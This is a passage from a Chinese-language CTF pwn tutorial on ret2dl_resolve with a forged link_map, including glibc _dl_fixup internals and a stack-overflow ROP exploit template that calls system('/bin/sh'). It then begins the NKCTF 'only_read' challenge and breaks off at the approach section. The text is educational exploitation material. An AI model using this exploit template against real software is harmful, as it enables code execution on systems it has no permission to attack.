*strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<br>  <span class="hljs-comment">//获取函数对应的重定位表结构地址</span><br>  <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<br>    <br>  <span class="hljs-comment">//获取函数对应的符号表结构地址</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>  <span class="hljs-comment">//得到函数对应的got地址，即真实函数地址要填回的地址</span><br>  <span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<br><br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">//判断重定位表的类型，必须要为7--ELF_MACHINE_JMP_SLOT</span><br>  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);<br>   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="hljs-comment">      used don&#x27;t look in the global scope.  */</span><br><br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<br>   &#123;<br>     ...<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><br><span class="hljs-comment">     address) is also known.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);<br>      result = l;<br>    &#125;<br><br>...<br><br>  <span class="hljs-comment">// 最后把value写入相应的GOT表条目rel_addr中</span><br>  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>之前是通过伪造reloc_arg</strong></p><p><strong>现在转变为伪造link_map–&gt;l_addr以及Elf64_Sym –&gt; st_value</strong></p><ul><li>伪造 link_map-&gt;l_addr 为libc中已解析函数与想要执行的目标函数的偏移值，如 addr_system-addr_xxx</li><li>伪造 sym-&gt;st_value 为已经解析过的某个函数的 got 表的位置</li><li>也就是相当于 value &#x3D; l_addr + st_value &#x3D; addr_system - addr_xxx + real_xxx &#x3D; real_system</li></ul><h4 id="伪造st-value"><a href="#伪造st-value" class="headerlink" title="伪造st_value"></a>伪造st_value</h4><p><strong>Elf64_Sym结构体</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span> <br>  Elf64_Word    st_name;        <span class="hljs-comment">/* Symbol name (string tbl index) */</span>  p32<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_info;        <span class="hljs-comment">/* Symbol type and binding */</span>  <br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> st_other;       <span class="hljs-comment">/* Symbol visibility */</span> <br>  Elf64_Section st_shndx;       <span class="hljs-comment">/* Section index */</span> p16<br>  Elf64_Addr    st_value;       <span class="hljs-comment">/* Symbol value */</span> p64<br>  Elf64_Xword   st_size;        <span class="hljs-comment">/* Symbol size */</span> p64<br>&#125; Elf64_Sym;<br><span class="hljs-comment">//大小：24字节</span><br></code></pre></td></tr></table></figure><p>st_value_addr &#x3D;&#x3D; Sym_addr + 0x8</p><p>所以，设置got表地址-0x8处为Sym_addr，则设置value为got表上的值</p><p>此时，st_orther不为0，可以绕过check</p><h4 id="伪造link-map"><a href="#伪造link-map" class="headerlink" title="伪造link_map"></a><strong>伪造link_map</strong></h4><p><strong>link_map结构体（简略版）</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; ptype l<br>    <br><span class="hljs-comment">//link_map结构体   </span><br>type = <span class="hljs-keyword">struct</span> link_map &#123;<br>    Elf64_Addr l_addr; <br>    <br>    <span class="hljs-type">char</span> *l_name;<br>    <br>    Elf64_Dyn *l_ld;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_next</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_prev</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l_real</span>;</span><br>    <br>    Lmid_t l_ns;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">libname_list</span> *<span class="hljs-title">l_libname</span>;</span><br>    <br>    ⭐Elf64_Dyn *l_info[<span class="hljs-number">76</span>];  <span class="hljs-comment">//l_info 里面包含的就是动态链接的各个表的信息</span><br>    <br>    ...<br>    <span class="hljs-type">size_t</span> l_tls_firstbyte_offset;<br>    <br>    <span class="hljs-type">ptrdiff_t</span> l_tls_offset;<br>    <br>    <span class="hljs-type">size_t</span> l_tls_modid;<br>    <br>    <span class="hljs-type">size_t</span> l_tls_dtor_count;<br>    <br>    Elf64_Addr l_relro_addr;<br>    <br>    <span class="hljs-type">size_t</span> l_relro_size;<br>    <br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> l_serial;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">auditstate</span> <span class="hljs-title">l_audit</span>[];</span><br>&#125; *<br></code></pre></td></tr></table></figure><ol><li><p><strong>主要目的：控制l_addr为已解析函数与想要执行的目标函数的偏移值</strong></p><p>但是，伪造的link_map要合规，通过_dl_fixup的检测，所以需要进一步的伪造</p></li><li><p><strong>_dl_fixup的check</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//check1: assert ((reloc-&gt;r_info &amp; 0xffffffff) == 0x7);</span><br><span class="hljs-comment">//效果: 检查reloc-&gt;r_info是否是有效的JUMP_SLOT</span><br>assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);<br><br><span class="hljs-comment">//check2: if (__builtin_expect ((sym-&gt;st_other &amp; 0x03), 0) == 0)</span><br></code></pre></td></tr></table></figure><p>满足1：<code>reloc-&gt;r_info == 0x7 </code>，在对应处伪造即可</p><p>满足2：<code>sym-&gt;st_other &amp; 0x03  != 0 </code>，当st_value伪造成功时即可</p></li><li><p><strong>_dl_fixup的正常使用</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-comment">//获取符号表地址</span><br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab= (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<br>  <span class="hljs-comment">//获取字符串表地址</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<br>  <span class="hljs-comment">//获取函数对应的重定位表结构地址</span><br>  <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<br><br><span class="hljs-comment">//重点`l_info[DT_SYMTAB]`，`l_info[DT_STRTAB]`，`l_info[DT_JMPREL]`</span><br></code></pre></td></tr></table></figure><p><strong>此时情况：保证l-&gt;l_addr是我们想要的值，但又没法泄露libc</strong></p><ul><li><p><strong>需要控制符号表<code>symtab</code>以及<code>reloc-&gt;r_info</code>，为了控制，需要伪造<code>DT_SYMTAB</code>和<code>DT_JMPREL</code></strong></p></li><li><p><strong>需要伪造<code>strtab</code>指向可控地址，为了控制，需要伪造<code>DT_STRTAB</code></strong></p><p>pwndbg动态调试查看三个指针的位置</p><ul><li>DT_STRTAB指针：位于link_map_addr +0x68(32位下是0x34)</li><li>DT_SYMTAB指针：位于link_map_addr + 0x70(32位下是0x38)</li><li>DT_JMPREL指针：位于link_map_addr +0xF8(32位下是0x7C)</li></ul></li><li><p><strong>需要伪造<code>Elf64_Sym</code>结构体，<code>Elf64_Rela</code>结构体，且DT_JMPREL指向<code>Elf64_Dyn</code>，所以也要伪造</strong></p></li><li><p><strong>还需要伪造<code>reloc_offset==0</code></strong></p></li></ul></li></ol><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p><strong>在No Relro的情况下，可以直接改写.dynamic的DT_STRTAB，不考虑，碰到再说</strong></p><p><strong>题目： Partial RELRO，No-pie</strong></p><p>根据利用思路2，搓模板</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> buff[<span class="hljs-number">20</span>];<br>    read(<span class="hljs-number">0</span>, buff, <span class="hljs-number">0x90</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>思考：</strong></p><p><strong>在仅有一次read机会时，可以使用的东西有哪些；</strong></p><ul><li><p><strong>Gadget：</strong>pop;ret  +  leave_ret  +  函数got地址</p></li><li><p><strong>地址：</strong>bss段地址，fake_linkmap_addr</p></li><li><p><strong>动态链接：</strong>Dynsym，Jmprel，Strtab</p></li></ul><p><strong>该如何控制</strong></p><ol><li>sym-&gt;st_value等于某个got上已经解析了的函数的那一表项</li><li>l-&gt;l_addr设置为目标与已解析函数的偏移值</li><li>伪造位于link_map+0x68的DT_STRTAB指针，使strtab为可读的地址</li><li>伪造位于link_map+0x70的DT_SYMTAB指针</li><li>伪造位于link_map+0xf8的DT_JMPREL指针</li><li>之后就是伪造.dynamic中的DT_SYMTAB结构体和DT_JMPREL结构体以及函数所对应的Elf64_Rela结构体</li><li>为了方便，在构造的过程中一般将reloc_arg作为0来进行构造</li></ol><p><strong>在伪造link_map前，先伪造好三个重定位表及对应地址</strong></p><p>伪造.dynamic里的重定位表项</p><p><code>fake_dyn_JMPREL = p64(0) + p64(fake_rela_addr)</code></p><p>伪造重定位表</p><p><code>fake_rela = p64(r_offset) + p64(0x7) + p64(0)</code></p><p>伪造符号表</p><p><code>fake_dyn_SYM = p32(0) + p32(0xffffffff) + p64(st_value-0x8) + p64(0)</code></p><p><strong>模板：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-comment">#gadge1: pop;ret </span><br>pop_rdi = <span class="hljs-number">0x401683</span>  <br>pop_rsi = <span class="hljs-number">0x401681</span>   <span class="hljs-comment">#pop rsi ; pop r15 ; ret</span><br>read_addr = <span class="hljs-number">0x4013C4</span><br>leave_ret = <span class="hljs-number">0x00000000004013c2</span> <span class="hljs-comment">#此处不用</span><br><br><span class="hljs-comment">#gadget2:.dynamic</span><br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><span class="hljs-comment">#.plt:0000000000401026 F2 FF 25 E3 2F 00 00          bnd jmp cs:qword_404010</span><br>plt_load = <span class="hljs-number">0x0000000000401026</span> <br><br><span class="hljs-comment">#gadget3: fake_link_map</span><br>bss = <span class="hljs-number">0x404060</span> <br>link_map_addr = bss + <span class="hljs-number">0x100</span><br>l_addr = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]  <span class="hljs-comment">#目的地址-已解析地址</span><br>r_offset = link_map_addr - l_addr<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Fake_Link_map</span>(<span class="hljs-params">link_map_addr, l_addr, st_value</span>):<br>    <span class="hljs-comment">#fake_pointer_addr</span><br>    fake_dyn_STR_addr = p64(link_map_addr)<br>    fake_dyn_JMPREL_addr = p64(link_map_addr+<span class="hljs-number">0x8</span>)<br>    fake_rela_addr = link_map_addr+<span class="hljs-number">0x18</span><br>    fake_dyn_SYM_addr = p64(link_map_addr+<span class="hljs-number">0x30</span>)<br>    <br>    <span class="hljs-comment">#fake_structure</span><br>    fake_dyn_JMPREL = p64(<span class="hljs-number">0</span>) + p64(fake_rela_addr)<br>    fake_rela = p64(r_offset) + p64(<span class="hljs-number">0x7</span>) + p64(<span class="hljs-number">0</span>)<br>    fake_dyn_SYM = p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0xffffffff</span>) + p64(st_value-<span class="hljs-number">0x8</span>) + p64(<span class="hljs-number">0</span>)<br>    <br>    <span class="hljs-comment">#fake_link_map</span><br>    link_map =  p64(l_addr&amp;(<span class="hljs-number">2</span>**<span class="hljs-number">64</span>-<span class="hljs-number">1</span>))<br>    link_map += fake_dyn_JMPREL   <span class="hljs-comment"># 0x8     </span><br>    link_map += fake_rela<span class="hljs-comment"># 0x18</span><br>    link_map += fake_dyn_SYM      <span class="hljs-comment"># 0x30</span><br>    link_map += <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x20</span>        <span class="hljs-comment"># 0x40</span><br>    link_map += fake_dyn_STR_addr    <span class="hljs-comment"># STRTAB link_map_addr +0x68</span><br>    link_map += fake_dyn_SYM_addr   <span class="hljs-comment"># SYMTAB link_map_addr +0x70</span><br>    link_map += <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>    link_map += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x78</span> <br>    link_map += fake_dyn_JMPREL_addr  <span class="hljs-comment"># JMPREL link_map_addr +0xf8        </span><br>    <br>    <span class="hljs-keyword">return</span> link_map<br><br><span class="hljs-comment">#payload1:栈溢出--&gt;向目的地址写入fake_link_map &amp;&amp; 栈迁移</span><br>payload =  <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> <br>payload += p64(pop_rsi) + p64(link_map_addr) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(read_plt)  <span class="hljs-comment">#read1: read in bss -&gt; fake_link_map</span><br>payload += p64(read_addr) <span class="hljs-comment">#read2: ret2dl_reslove </span><br>sl(payload)<br><br><span class="hljs-comment">#payload2:fake_link_map</span><br>fake_link_map = Fake_Link_map(link_map_addr, l_addr, read_got)<br>pause()<br>sl(fake_link_map)<br><br><span class="hljs-comment">#payload3:ret2dl_reslove, pop_rdi: &#x27;/bin/sh&#x27; + plt_load + link_map_addr</span><br><span class="hljs-comment">#ret2dl_reslove</span><br>ROP =  <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span> <br>ROP += p64(pop_rdi) + p64(link_map_addr + <span class="hljs-number">0x78</span>)     <span class="hljs-comment">#&#x27;/bin/sh&#x27;</span><br>ROP +=  p64(plt_load) + p64(link_map_addr) + p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#plt-&gt;got-&gt;read_got</span><br>pause()<br>sl(ROP)<br></code></pre></td></tr></table></figure><h1 id="例题：NKCTF-only-read"><a href="#例题：NKCTF-only-read" class="headerlink" title="例题：NKCTF-only_read"></a>例题：NKCTF-only_read</h1><p><strong>有一条更方便的rop链，同时学习ret2dl_reslove</strong></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><strong>保护</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">chen@chen:~/桌面/match/NK/only_read$ checksec ./pwn<br>[*] <span class="hljs-string">&#x27;/home/chen/桌面/match/NK/only_read/pwn&#x27;</span><br>    Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO <span class="hljs-comment">//可以改got表</span><br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><span class="hljs-comment">//没有随机地址</span><br></code></pre></td></tr></table></figure><p><strong>main</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s1[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-80h] BYREF</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-40h] BYREF</span><br><br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>    <br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  <span class="hljs-built_in">memset</span>(s1, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s1));<br>  read(<span class="hljs-number">0</span>, s, <span class="hljs-number">0x30</span>uLL);<br>  base_decode(s, s1);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;Welcome to NKCTF!&quot;</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  <span class="hljs-built_in">memset</span>(s1, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s1));<br>  read(<span class="hljs-number">0</span>, s, <span class="hljs-number">0x30</span>uLL);<br>  base_decode(s, s1);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;tell you a secret:&quot;</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  <span class="hljs-built_in">memset</span>(s1, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s1));<br>  read(<span class="hljs-number">0</span>, s, <span class="hljs-number">0x40</span>uLL);<br>  base_decode(s, s1);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9&quot;</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <br>  <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s));<br>  <span class="hljs-built_in">memset</span>(s1, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(s1));<br>  read(<span class="hljs-number">0</span>, s, <span class="hljs-number">0x40</span>uLL);<br>  base_decode(s, s1);<br>  <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;can you find me?&quot;</span>) )<br>    next(); <span class="hljs-comment">//有个栈溢出</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">next</span><span class="hljs-params">()</span> <span class="hljs-comment">//仅仅一个溢出</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">48</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x200</span>uLL);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>base_decode(s, s1)</strong></p><p>输入s，输出s1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">base_decode</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> __int8 s; <span class="hljs-comment">// [rsp+13h] [rbp-Dh] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int8 v7; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int8 v8; <span class="hljs-comment">// [rsp+15h] [rbp-Bh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v9; <span class="hljs-comment">// [rsp+16h] [rbp-Ah]</span><br>  <span class="hljs-type">unsigned</span> __int8 i; <span class="hljs-comment">// [rsp+17h] [rbp-9h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  v12 = <span class="hljs-number">0</span>;<br>  v11 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( *(_BYTE *)(v12 + a1) )<br>  &#123;<br>    <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">255</span>, <span class="hljs-number">4uLL</span>);<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0x3F</span>u; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( aAbcdefghijklmn[i] == *(_BYTE *)(v12 + a1) )<br>        s = i;<br>    &#125;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0x3F</span>u; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( aAbcdefghijklmn[i] == *(_BYTE *)(v12 + <span class="hljs-number">1LL</span> + a1) )<br>        v7 = i;<br>    &#125;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0x3F</span>u; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( aAbcdefghijklmn[i] == *(_BYTE *)(v12 + <span class="hljs-number">2LL</span> + a1) )<br>        v8 = i;<br>    &#125;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0x3F</span>u; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( aAbcdefghijklmn[i] == *(_BYTE *)(v12 + <span class="hljs-number">3LL</span> + a1) )<br>        v9 = i;<br>    &#125;<br>    v2 = v11++;<br>    *(_BYTE *)(v2 + a2) = (v7 &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">3</span> | (<span class="hljs-number">4</span> * s);<br>    <span class="hljs-keyword">if</span> ( *(_BYTE *)(v12 + <span class="hljs-number">2LL</span> + a1) == <span class="hljs-number">61</span> )<br>      <span class="hljs-keyword">break</span>;<br>    v3 = v11++;<br>    *(_BYTE *)(v3 + a2) = (v8 &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">0xF</span> | (<span class="hljs-number">16</span> * v7);<br>    <span class="hljs-keyword">if</span> ( *(_BYTE *)(v12 + <span class="hljs-number">3LL</span> + a1) == <span class="hljs-number">61</span> )<br>      <span class="hljs-keyword">break</span>;<br>    v4 = v11++;<br>    *(_BYTE *)(v4 + a2) = v9 &amp; <span class="hljs-number">0x3F</span> | (v8 &lt;&lt; <span class="hljs-number">6</span>);<br>    v12 += <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v11;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><strong>四段base64校验，之后一个栈溢出</strong></p><p><strong>Toka：有可以直接利用的ROP链</strong></p><p>题目Partial 